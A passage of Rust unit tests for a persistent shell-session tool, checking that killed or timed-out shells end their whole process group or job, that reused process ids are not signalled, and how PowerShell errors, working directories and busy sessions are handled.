        let dir = std::env::temp_dir().join(format!("ghost-test-expired-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let born = platform::creation_time(ping.id()).expect("creation time");
        let old = platform::now_ms() - 2 * 86_400_000;
        let text = platform::snapshot_header(old, platform::boot_ms()) + &format!("{} {born}\n", ping.id());
        std::fs::write(dir.join("ghost-shell-job-1-1"), text).unwrap();
        platform::end_all_listed(&dir, 7);
        std::thread::sleep(Duration::from_millis(300));
        let survived = ping.try_wait().unwrap().is_none();
        let left = std::fs::read_dir(&dir).map(|d| d.count()).unwrap_or(0);
        let _ = ping.kill();
        let _ = ping.wait();
        let _ = std::fs::remove_dir_all(&dir);
        assert!(survived, "an expired snapshot ended a process");
        assert_eq!(left, 0, "the expired snapshot was not dropped");
    }

    /// The Linux tests that end every group this process started run one at
    /// a time, or one would end the other's groups mid-test.
    /// `session_tests` hold it too: their shells are confined groups as well.
    #[cfg(target_os = "linux")]
    pub(super) static LINUX_GROUPS_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    /// A process group of its own running `sleep`, confined as a shell is.
    #[cfg(target_os = "linux")]
    fn confined_sleeper() -> std::process::Child {
        use std::os::unix::process::CommandExt;
        let child = std::process::Command::new("sleep").arg("39").process_group(0).spawn().expect("sleep");
        platform::confine(Some(child.id())).expect("confine");
        child
    }

    /// Linux: thousands of remembered groups whose shells are long gone (a
    /// long-lived server runs many commands) do not make the stop slow, and
    /// the live group among them still ends.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_stop_over_thousands_of_dead_groups_is_fast() {
        let _serial = LINUX_GROUPS_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        // Ids above any pid_max: no process has them, as for exited shells.
        for i in 0..5_000u32 {
            platform::remember_for_test(4_200_000 + i, 1);
        }
        let mut live = confined_sleeper();
        let started = Instant::now();
        platform::end_on_stop();
        let took = started.elapsed();
        let deadline = Instant::now() + Duration::from_secs(3);
        while Instant::now() < deadline && matches!(live.try_wait(), Ok(None)) {
            std::thread::sleep(Duration::from_millis(20));
        }
        let ended = !matches!(live.try_wait(), Ok(None));
        let _ = live.kill();
        let _ = live.wait();
        assert!(ended, "the live group survived the stop");
        assert!(took < Duration::from_millis(200), "the stop took {took:?} over 5000 dead groups");
    }

    /// A bash leading its own group with a background `sleep`; returns the
    /// sleep's pid too.
    #[cfg(target_os = "linux")]
    async fn shell_with_a_child() -> (Child, Option<Group>, u32) {
        use tokio::io::AsyncBufReadExt;
        let mut cmd = Command::new("bash");
        cmd.args(["-c", "sleep 45 & echo $!; wait"]).stdout(Stdio::piped()).kill_on_drop(true);
        in_own_group(&mut cmd);
        let mut child = cmd.spawn().expect("bash");
        let group = group_of(child.id());
        let mut line = String::new();
        let mut out = tokio::io::BufReader::new(child.stdout.take().unwrap());
        out.read_line(&mut line).await.unwrap();
        (child, group, line.trim().parse().expect("sleep pid"))
    }

    /// Whether `pid` is gone (or a zombie) within 3 s.
    #[cfg(target_os = "linux")]
    fn ends(pid: u32) -> bool {
        let deadline = Instant::now() + Duration::from_secs(3);
        loop {
            let alive = std::fs::read_to_string(format!("/proc/{pid}/stat"))
                .ok()
                .and_then(|s| s.rsplit_once(')').map(|r| r.1.split_whitespace().next() != Some("Z")))
                .unwrap_or(false);
            if !alive {
                return true;
            }
            if Instant::now() >= deadline {
                // Ours: started by this test.
                let _ = std::process::Command::new("kill").args(["-KILL", &pid.to_string()]).status();
                return false;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    #[cfg(target_os = "linux")]
    fn rt() -> tokio::runtime::Runtime {
        tokio::runtime::Builder::new_current_thread().enable_all().build().unwrap()
    }

    /// Linux: a timeout or `op=kill` ends what the shell's command started,
    /// not just the shell.
    #[cfg(target_os = "linux")]
    #[test]
    fn giving_up_on_a_shell_ends_its_whole_group() {
        let (sleeper, ended) = rt().block_on(async {
            let (mut child, group, sleeper) = shell_with_a_child().await;
            end_shell(&mut child, group);
            let _ = child.wait().await;
            (sleeper, ends(sleeper))
        });
        assert!(ended, "sleep {sleeper} outlived its shell's timeout/kill");
    }

    /// Linux: a call dropped mid-command (the request was cancelled) ends the
    /// command's group; one that finished leaves its background programs be.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_dropped_call_ends_its_group_and_a_finished_one_does_not() {
        let (sleeper, ended) = rt().block_on(async {
            let (child, group, sleeper) = shell_with_a_child().await;
            let guard = GroupGuard(group);
            drop(guard);
            drop(child);
            (sleeper, ends(sleeper))
        });
        assert!(ended, "sleep {sleeper} outlived a dropped call");

        let (sleeper, alive) = rt().block_on(async {
            let (mut child, group, sleeper) = shell_with_a_child().await;
            let mut guard = GroupGuard(group);
            guard.disarm();
            drop(guard);
            let _ = child.start_kill();
            let _ = child.wait().await;
            tokio::time::sleep(Duration::from_millis(200)).await;
            (sleeper, std::path::Path::new(&format!("/proc/{sleeper}")).exists())
        });
        // Ours: started by this test.
        let _ = std::process::Command::new("kill").args(["-KILL", &sleeper.to_string()]).status();
        assert!(alive, "a finished call ended its background program {sleeper}");
    }

    /// The pure decision, over an injected process table: 5000 groups that
    /// ended and one live group take one pass, and only the live group, a
    /// group whose leader exited but whose command lives on, are signalled -
    /// never a reused id.
    #[cfg(unix)]
    #[test]
    fn the_groups_to_end_come_from_one_table_read() {
        // (pid, pgid, start): a live leader 500 (start 10); group 600 whose
        // leader exited but a child (start 21 >= 20) lives; id 700 reused by
        // a different process (start 99, not 30).
        let table = platform::ProcTable::from_rows([(500, 500, 10), (601, 600, 21), (700, 700, 99), (1, 1, 0)]);
        let mut groups: Vec<(u32, u64)> = (0..5_000u32).map(|i| (4_200_000 + i, 1)).collect();
        groups.extend([(500, 10), (600, 20), (700, 30)]);
        let started = Instant::now();
        let end = platform::groups_to_end(&groups, &table);
        assert!(started.elapsed() < Duration::from_millis(200), "took {:?}", started.elapsed());
        assert_eq!(end, vec![500, 600]);
    }

    /// Linux: groups whose processes have all exited are forgotten without a
    /// stop, so the list does not grow for the life of the server.
    #[cfg(target_os = "linux")]
    #[test]
    fn groups_that_ended_are_forgotten() {
        let _serial = LINUX_GROUPS_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        platform::end_on_stop();
        for i in 0..5_000u32 {
            platform::remember_for_test(4_200_000 + i, 1);
        }
        let mut live = confined_sleeper();
        let remembered = platform::remembered_for_test();
        let _ = live.kill();
        let _ = live.wait();
        assert!(remembered <= 64, "{remembered} groups remembered; the dead ones were never pruned");
    }

    /// (b) Linux: the stop kills the shell's whole process group, so what a
    /// command started (here `sleep`, started by bash) ends with it.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_stop_kills_the_shells_process_group_on_linux() {
        use std::os::unix::process::CommandExt;
        let _serial = LINUX_GROUPS_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut bash = std::process::Command::new("bash")
            .args(["-c", "sleep 37 & wait"])
            .process_group(0)
            .spawn()
            .expect("bash");
        let pgid = bash.id();
        platform::confine(Some(pgid)).expect("confine");
        std::thread::sleep(Duration::from_millis(300));
        // The sleep in that group.
        let in_group = |pid: &str| {
            std::fs::read_to_string(format!("/proc/{pid}/stat"))
                .ok()
                .map(|st| {
                    let rest = st.rsplit(')').next().unwrap_or("").to_string();
                    let f: Vec<&str> = rest.split_whitespace().collect();
                    (f.first().copied() != Some("Z")) && f.get(2).copied() == Some(pgid.to_string().as_str())
                })
                .unwrap_or(false)
        };
        let members = || -> Vec<String> {
            std::fs::read_dir("/proc")
                .map(|d| {
                    d.flatten()
                        .map(|e| e.file_name().to_string_lossy().into_owned())
                        .filter(|n| n.chars().all(|c| c.is_ascii_digit()) && in_group(n))
                        .collect()
                })
                .unwrap_or_default()
        };
        assert!(members().len() >= 2, "bash and its sleep should be in the group: {:?}", members());
        platform::end_on_stop();
        let _ = bash.wait();
        let deadline = Instant::now() + Duration::from_secs(3);
        while !members().is_empty() && Instant::now() < deadline {
            std::thread::sleep(Duration::from_millis(50));
        }
        assert!(members().is_empty(), "the stop left the group alive: {:?}", members());
    }

    /// Linux: a group whose leader id now belongs to a different process (the
    /// id was reused) is never signalled.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_reused_group_id_is_not_signalled() {
        let me = std::process::id();
        let mine = platform::start_time(me).expect("own start time");
        assert!(platform::group_still_ours(me, mine), "the same process");
        assert!(!platform::group_still_ours(me, mine + 1), "a different process under the same id");
        assert!(!platform::group_still_ours(u32::MAX - 7, 1), "no leader and no member: not ours");
    }
}

/// Persistent-session behaviour against a real driver. Only harmless commands
/// (echo, short sleeps, exit codes); every shell started here is ended here.
#[cfg(test)]
mod session_tests {
    use super::*;

    fn rt() -> tokio::runtime::Runtime {
        tokio::runtime::Builder::new_multi_thread().enable_all().build().unwrap()
    }

    /// Linux: the tests that end every group this process started would end
    /// these tests' shells too, so a test that runs a shell holds their lock.
    fn hold_groups() -> Option<std::sync::MutexGuard<'static, ()>> {
        #[cfg(target_os = "linux")]
        return Some(super::stop_reach_tests::LINUX_GROUPS_LOCK.lock().unwrap_or_else(|e| e.into_inner()));
        #[cfg(not(target_os = "linux"))]
        None
    }

    /// Frame one command onto a driver and return its sentinel token.
    async fn frame(sess: &mut ShellSession, cmd: &str) -> String {
        sess.nonce += 1;
        let token = sentinel_token(&sess.secret, sess.nonce);
        let line = format!("{} {}\n", token, b64_encode(cmd.as_bytes()));
        sess.stdin.write_all(line.as_bytes()).await.unwrap();
        sess.stdin.flush().await.unwrap();
        token
    }

    /// A driver that has answered one command, so cold start is not timed.
    async fn warm_driver() -> ShellSession {
        let mut sess = spawn_driver(None).expect("spawn driver");
        let token = frame(&mut sess, "echo warm-up").await;
        let first = read_until_sentinel(&mut sess, &token, Duration::from_secs(90)).await;
        assert!(matches!(first, ReadOutcome::Done { .. }), "the driver never answered");
        sess
    }

    fn sleep_then_q() -> &'static str {
        if cfg!(target_os = "linux") {
            "sleep 0.3; echo q"
        } else {
            "Start-Sleep -Milliseconds 300; 'q'"
        }
    }

    fn sleep_one_second() -> &'static str {
        if cfg!(target_os = "linux") {
            "sleep 1"
        } else {
            "Start-Sleep -Seconds 1"
        }
    }

    fn listed(reg: &Mutex<ShellRegistry>, id: &str) -> Option<Value> {
        let all = shell_list(reg);
        all["sessions"].as_array().unwrap().iter().find(|s| s["id"] == id).cloned()
    }

    /// Whether a process whose recorded parent is `ppid` really is a child of
    /// `parent`. Windows never updates a process's parent id when the parent
    /// exits, and process ids are reused, so the parent id alone is not
    /// enough.
    #[cfg(windows)]
    fn is_child_of(ppid: u32, child_born: Option<u64>, parent: u32, parent_born: Option<u64>) -> bool {
        ppid == parent && matches!((child_born, parent_born), (Some(c), Some(p)) if c >= p)
    }

    /// A process older than `parent` that names it as parent is an orphan
    /// whose real parent exited and whose id `parent` now reuses. Under the
    /// full suite's process churn one shell test matched another test's ping
    /// this way, then saw it die (or killed it) and failed intermittently.
    #[cfg(windows)]
    #[test]
    fn an_older_process_naming_a_reused_parent_id_is_not_its_child() {
        assert!(is_child_of(40, Some(200), 40, Some(100)), "born after the parent: a child");
        assert!(is_child_of(40, Some(100), 40, Some(100)), "same tick: a child");
        assert!(!is_child_of(40, Some(90), 40, Some(100)), "born before the parent: an orphan of a reused id");
        assert!(!is_child_of(41, Some(200), 40, Some(100)), "another parent");
        assert!(!is_child_of(40, None, 40, Some(100)), "unknown birth: not claimed");
        assert!(!is_child_of(40, Some(200), 40, None), "parent gone: not claimed");
    }

    /// Child processes of `parent` named `exe` (Toolhelp snapshot).
    #[cfg(windows)]
    fn children_named(parent: u32, exe: &str) -> Vec<u32> {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
        };
        let mut out = Vec::new();
        let parent_born = platform::creation_time(parent);
        unsafe {
            let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) else { return out };
            let mut e = PROCESSENTRY32W { dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32, ..Default::default() };
            if Process32FirstW(snap, &mut e).is_ok() {
                loop {
                    let n = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(e.szExeFile.len());
                    if e.th32ParentProcessID == parent
                        && String::from_utf16_lossy(&e.szExeFile[..n]).eq_ignore_ascii_case(exe)
                        && is_child_of(e.th32ParentProcessID, platform::creation_time(e.th32ProcessID), parent, parent_born)
                    {
                        out.push(e.th32ProcessID);
                    }
                    if Process32NextW(snap, &mut e).is_err() {
                        break;
                    }
                }
            }
            let _ = CloseHandle(snap);
        }
        out
    }

    /// Whether process `pid` has exited within 3 s.
    #[cfg(windows)]
    fn win_ends(pid: u32) -> bool {
        use windows::Win32::Foundation::{CloseHandle, WAIT_OBJECT_0};
        use windows::Win32::System::Threading::{OpenProcess, WaitForSingleObject, PROCESS_SYNCHRONIZE};
        unsafe {
            let Ok(h) = OpenProcess(PROCESS_SYNCHRONIZE, false, pid) else { return true };
            let gone = WaitForSingleObject(h, 3000) == WAIT_OBJECT_0;
            let _ = CloseHandle(h);
            gone
        }
    }

    /// Windows, like Linux: giving up on a shell (`op=kill`, a timeout, a
    /// dropped call) ends what its command started, not just the shell.
    #[cfg(windows)]
    #[test]
    fn giving_up_on_a_shell_ends_its_whole_tree() {
        let (ping, ended) = rt().block_on(shell_then_ping(true));
        assert!(ended, "ping {ping} outlived its shell's kill");
    }

    /// The shell's own job is not kill-on-close: a shell that simply ends (a
    /// finished command) and drops its job leaves what it started running -
    /// `Start-Process` apps must survive their `op=run`.
    #[cfg(windows)]
    #[test]
    fn dropping_a_shells_job_leaves_its_programs_running() {
        let (ping, ended) = rt().block_on(shell_then_ping(false));
        assert!(!ended, "ping {ping} died with its shell's job handle (kill-on-close?)");
    }

    /// Start cmd running ping in its own [`Group`], then either give up on it
    /// (`end_shell`) or just end the shell and drop the group. Returns the
    /// ping's pid and whether it ended within 3 s; a ping still running is
    /// then ended (only if it is still the same process).
    #[cfg(windows)]
    async fn shell_then_ping(give_up: bool) -> (u32, bool) {
        let mut cmd = Command::new("cmd");
        cmd.args(["/S", "/C", "ping -n 30 127.0.0.1 >nul"])
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .kill_on_drop(true);
        no_console_window(&mut cmd);
        let (mut shell, group) = spawn_confined(&mut cmd, Duration::ZERO).expect("spawn cmd");
        assert!(group.is_some(), "the shell got no job of its own");
        let shell_pid = shell.id().expect("cmd pid");
        let deadline = Instant::now() + Duration::from_secs(10);
        let ping = loop {
            if let Some(&p) = children_named(shell_pid, "PING.EXE").first() {
                break p;
            }
            assert!(Instant::now() < deadline, "cmd never started ping");
            tokio::time::sleep(Duration::from_millis(50)).await;
        };
        let born = platform::creation_time(ping);
        if give_up {
            end_shell(&mut shell, group);
        } else {
            let _ = shell.start_kill();
            drop(group);
        }
        let _ = shell.wait().await;
        let ended = win_ends(ping);
        // Ours: started by this test, and still the same process.
        if !ended && born.is_some() && platform::creation_time(ping) == born {
            let _ = ghost_core::process::kill(ping);
        }
        (ping, ended)
    }

    /// A program a shell starts is in the stop job even when the shell is
    /// adopted late: the shell must not run anything before it is in the job.
    /// The delay widens the spawn-to-adopt window that load opened in a
    /// `cargo test --workspace` run, where a ping escaped the stop.
    #[cfg(windows)]
    #[test]
    fn a_shell_cannot_start_a_program_before_it_is_in_the_stop_job() {
        rt().block_on(async {
            let mut cmd = Command::new("cmd");
            cmd.args(["/S", "/C", "ping -n 30 127.0.0.1 >nul"])
                .stdin(Stdio::null())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .kill_on_drop(true);
            no_console_window(&mut cmd);
            let (mut shell, _group) = spawn_confined(&mut cmd, Duration::from_millis(1500)).expect("spawn cmd");
            let shell_pid = shell.id().expect("cmd pid");
            let deadline = Instant::now() + Duration::from_secs(10);
            let ping = loop {
                if let Some(&p) = children_named(shell_pid, "PING.EXE").first() {
                    break Some(p);
                }
                if Instant::now() > deadline {
                    break None;
                }
                tokio::time::sleep(Duration::from_millis(50)).await;
            };
            let in_job = ping.is_some_and(|p| platform::job_members().contains(&p));
            if let Some(p) = ping {
                let _ = ghost_core::process::kill(p);
            }
            let _ = shell.start_kill();
            let _ = shell.wait().await;
            let ping = ping.expect("cmd never started ping");
            assert!(in_job, "ping {ping} started before its shell was adopted, outside the stop job");
        });
    }

    /// A shell the stop could not reach is never let run: when confining it
    /// fails, the spawn fails naming why and the suspended shell is ended.
    #[test]
    fn a_shell_that_cannot_be_confined_is_killed_not_resumed() {
        rt().block_on(async {
            #[cfg(windows)]
            let mut cmd = {
                let mut c = Command::new("cmd");
                c.args(["/S", "/C", "ping -n 2 127.0.0.1 >nul"]);
                no_console_window(&mut c);
                c
            };
            #[cfg(unix)]
            let mut cmd = {
                let mut c = Command::new("sleep");
                c.arg("1");
                c
            };
            cmd.stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).kill_on_drop(true);
            in_own_group(&mut cmd);
            let seen = std::sync::Mutex::new(None);
            let failing = |pid: Option<u32>| {
                *seen.lock().unwrap() = pid;
                Err("injected adopt failure".to_string())
            };
            let res = spawn_confined_with(&mut cmd, Duration::ZERO, &failing);
            let pid = seen.lock().unwrap().expect("confine saw the pid");
            let mut child = match res {
                Err(e) => {
                    assert!(e.to_string().contains("injected adopt failure"), "{e}");
                    None
                }
                Ok((c, _)) => Some(c),
            };
            #[cfg(windows)]
            let alive = platform::creation_time(pid).is_some();
            #[cfg(unix)]
            let alive = platform::start_time(pid).is_some();
            if let Some(c) = child.as_mut() {
                let _ = c.start_kill();
                let _ = c.wait().await;
            }
            assert!(child.is_none(), "spawn must fail closed when confining fails");
            assert!(!alive, "shell {pid} still exists after a failed confine");
        });
    }

    /// M3: the PowerShell driver reports a failed command as failed, with its
    /// error text, like a cold `powershell -Command` does - while native exit
    /// codes, native stderr on success and errors the command chose to
    /// silence keep their meaning.
    #[cfg(windows)]
    #[test]
    fn the_powershell_driver_reports_errors_as_a_nonzero_exit() {
        let cases: &[(&str, i64, &str)] = &[
            ("throw 'boom-x'", 1, "boom-x"),
            ("nosuchcmd_xyz", 1, "nosuchcmd_xyz"),
            ("Get-Item nosuchfile_xyz", 1, "nosuchfile_xyz"),
            ("Write-Output (", 1, "Missing"),
            ("Write-Error werr-x; 'after'", 1, "werr-x"),
            ("cmd /c exit 7", 7, ""),
            ("Write-Output fine-x", 0, "fine-x"),
            ("Get-Item nosuch_xyz -ErrorAction SilentlyContinue; 'quiet-x'", 0, "quiet-x"),
            ("cmd /c \"echo native-warn 1>&2\"", 0, ""),
            ("try { throw 'caught' } catch { 'handled-x' }", 0, "handled-x"),
            // Session state still persists between commands.
            ("$persist_x = 'kept-x'", 0, ""),
            ("$persist_x", 0, "kept-x"),
        ];
        let results = rt().block_on(async {
            let mut sess = warm_driver().await;
            let mut out = Vec::new();
            for (cmd, _, _) in cases {
                let token = frame(&mut sess, cmd).await;
                out.push(match read_until_sentinel(&mut sess, &token, Duration::from_secs(20)).await {
                    ReadOutcome::Done { output, exit_code } => (output, exit_code),
                    _ => (String::from("<no answer>"), None),
                });
            }
            let _ = sess.child.start_kill();
            out
        });
        let mut wrong = Vec::new();
        for ((cmd, code, text), (output, exit)) in cases.iter().zip(&results) {
            if *exit != Some(*code) || !output.contains(text) {
                wrong.push(format!("{cmd:?}: exit {exit:?} (want {code}), output {output:?} (want {text:?})"));
            }
        }
        assert!(wrong.is_empty(), "{}", wrong.join("\n"));
    }

    /// `exit N` in a command still ends the driver with N: the warm `op=run`
    /// path reports that as the command's exit code.
    #[cfg(windows)]
    #[test]
    fn exit_in_a_command_still_ends_the_driver_with_its_code() {
        let code = rt().block_on(async {
            let mut sess = warm_driver().await;
            let token = frame(&mut sess, "exit 5").await;
            let outcome = read_until_sentinel(&mut sess, &token, Duration::from_secs(20)).await;
            let eof = matches!(outcome, ReadOutcome::Eof { .. });
            let status = tokio::time::timeout(Duration::from_secs(10), sess.child.wait()).await;
            let _ = sess.child.start_kill();
            assert!(eof, "the driver kept running after exit 5");
            status.ok().and_then(|s| s.ok()).and_then(|s| s.code())
        });
        assert_eq!(code, Some(5));
    }

    /// M4: a cwd that is missing or not a directory is refused with the same
    /// clear error before any shell starts, warm path and cold alike.
    #[test]
    fn a_cwd_that_is_not_a_directory_is_refused_up_front() {
        let missing = std::env::temp_dir().join(format!("ghost-no-such-dir-{}", std::process::id()));
        let missing = missing.to_str().unwrap();
        let file = std::env::current_exe().unwrap();
        let file = file.to_str().unwrap();
        let dir = std::env::temp_dir();
        assert!(check_cwd(None).is_ok());
        assert!(check_cwd(Some(dir.to_str().unwrap())).is_ok());
        // A leading ~ is the user's home, as a shell user expects.
        assert!(check_cwd(Some("~")).is_ok(), "{:?}", check_cwd(Some("~")));
        let home = dir.to_str().unwrap();
        let sub = dir.join(format!("ghost-cwd-home-{}", std::process::id()));
        std::fs::create_dir_all(&sub).unwrap();
        let name = sub.file_name().unwrap().to_str().unwrap();
        assert_eq!(resolve_cwd(Some("~"), Some(home)).unwrap(), Some(home.to_string()));
        let seps: &[&str] = if cfg!(windows) { &["/", "\\"] } else { &["/"] };
        for tilde in seps.iter().map(|s| format!("~{s}{name}")) {
            let got = resolve_cwd(Some(&tilde), Some(home)).unwrap().expect("a dir");
            assert!(std::path::Path::new(&got).is_dir() && got.starts_with(home), "{tilde} -> {got}");
        }
        let _ = std::fs::remove_dir(&sub);
        // ~user and an unknown home are not guessed at.
        assert!(resolve_cwd(Some("~nosuchuser"), Some(home)).is_err());
        assert!(resolve_cwd(Some("~"), None).unwrap_err().to_string().contains("home directory is unknown"));
        // Provider paths stay refused, with a message that says why.
        for p in [r"HKLM:\", "Env:", r"Cert:\CurrentUser"] {
            let e = resolve_cwd(Some(p), Some(home)).unwrap_err().to_string();
            assert!(e.contains("provider paths"), "{p}: {e}");
        }
        for bad in [missing, file] {
            let e = check_cwd(Some(bad)).expect_err(bad).to_string();
            assert!(e.contains("is not an existing directory") && e.contains(bad), "{e}");
        }
        let opened = rt().block_on(shell_open(
            &Mutex::new(ShellRegistry::new()),
            &json!({"id": "m4", "cwd": missing}),
        ));
        let e = format!("{:?}", opened.expect_err("open in a missing cwd"));
        assert!(e.contains("is not an existing directory"), "{e}");
    }

    /// L8: kill ends the shell process at once, even while another call holds
    /// the session (a send blocked in a read); it does not wait for the lock
    /// before ending the process.
    #[test]
    fn kill_ends_the_shell_before_taking_the_session_lock() {
        let _groups = hold_groups();
        rt().block_on(async {
            let reg = std::sync::Arc::new(Mutex::new(ShellRegistry::new()));
            shell_open(&reg, &json!({"id": "l8"})).await.expect("open");
            let shell = reg.lock().unwrap().sessions["l8"].shell.clone();
            let mut held = shell.lock().await;
            let killer = tokio::spawn({
                let reg = reg.clone();
                async move { shell_kill(&reg, &json!({"id": "l8"})).await }
            });
            let deadline = Instant::now() + Duration::from_secs(3);
            let mut exited = false;
            while Instant::now() < deadline {
                if matches!(held.child.try_wait(), Ok(Some(_))) {
                    exited = true;
                    break;
                }
                tokio::time::sleep(Duration::from_millis(20)).await;
            }
            if !exited {
                let _ = held.child.start_kill();
            }
            drop(held);
            let r = tokio::time::timeout(Duration::from_secs(10), killer).await;
            assert!(exited, "the shell still ran while kill waited on the session lock");
            assert!(matches!(r, Ok(Ok(Ok(_)))), "kill did not finish: {r:?}");
        });
    }

    /// M2: a session stays visible while a command runs in it. list shows it
    /// busy, a second send or read is refused as busy (not "no session"), and
    /// kill ends it - the running send then reports the kill.
    #[test]
    fn a_session_running_a_command_is_listed_busy_and_can_be_killed() {
        let _groups = hold_groups();
        rt().block_on(async {
            let reg = std::sync::Arc::new(Mutex::new(ShellRegistry::new()));
            shell_open(&reg, &json!({"id": "m2"})).await.expect("open");
            shell_send(&reg, &json!({"id": "m2", "cmd": "echo warm-up", "timeout_ms": 90_000}))
                .await
                .expect("warm-up");

            let running = {
                let reg = reg.clone();
                tokio::spawn(async move {
                    shell_send(&reg, &json!({"id": "m2", "cmd": sleep_one_second(), "timeout_ms": 20_000})).await
                })
            };
            tokio::time::sleep(Duration::from_millis(300)).await;

            let row = listed(&reg, "m2");
            let second = shell_send(&reg, &json!({"id": "m2", "cmd": "echo 2"})).await;
            let read = shell_read(&reg, &json!({"id": "m2", "timeout_ms": 0})).await;
            let killed = shell_kill(&reg, &json!({"id": "m2"})).await;
            let first = running.await.unwrap();
            let after = listed(&reg, "m2");
            // Clean up whatever is left if an assertion below fails.
            let _ = shell_kill(&reg, &json!({"id": "m2"})).await;

            let row = row.expect("a session running a command vanished from op=list");
            assert_eq!(row["busy"], true, "{row}");
            let second = format!("{:?}", second.expect_err("a second send must be refused"));
            assert!(second.contains("busy") && !second.contains("no session"), "{second}");
            let read = format!("{:?}", read.expect_err("a concurrent read must be refused"));
            assert!(read.contains("busy") && !read.contains("no session"), "{read}");
            assert_eq!(killed.expect("kill a busy session")["killed"], true);
            let first = format!("{:?}", first.expect_err("the killed command must not report success"));
            assert!(first.contains("killed"), "{first}");
            assert!(after.is_none(), "a killed session is still listed: {after:?}");
        });
    }

    /// M1: a bare `op=read` waits a little for the pending command instead of
    /// returning before it reads anything; an explicit wait is honoured.
    #[test]
    fn a_read_with_no_timeout_waits_two_seconds() {
        assert_eq!(read_wait(None), Duration::from_millis(2_000));
        assert_eq!(read_wait(Some(0)), Duration::ZERO);
        assert_eq!(read_wait(Some(999_999_999)), Duration::from_millis(MAX_TIMEOUT_MS));
    }

    /// M1: output the command already wrote is collected even when the read
    /// has no wait left - the deadline is checked after a drain, not before.
    #[test]
    fn a_read_with_no_wait_left_still_collects_finished_output() {
        let _groups = hold_groups();
        rt().block_on(async {
            let mut sess = warm_driver().await;
            let token = frame(&mut sess, sleep_then_q()).await;
            let first = read_until_sentinel(&mut sess, &token, Duration::from_millis(100)).await;
            assert!(matches!(first, ReadOutcome::TimedOut { .. }), "should still be running");
            tokio::time::sleep(Duration::from_millis(1500)).await;
            let second = read_until_sentinel(&mut sess, &token, Duration::ZERO).await;
            let _ = sess.child.start_kill();
            match second {
                ReadOutcome::Done { output, exit_code } => {
                    assert!(output.contains('q'), "output was {output:?}");
                    assert_eq!(exit_code, Some(0));
                }
                ReadOutcome::TimedOut { .. } => panic!("a zero-wait read never drained finished output"),
                _ => panic!("unexpected outcome"),
            }
        });
    }
}
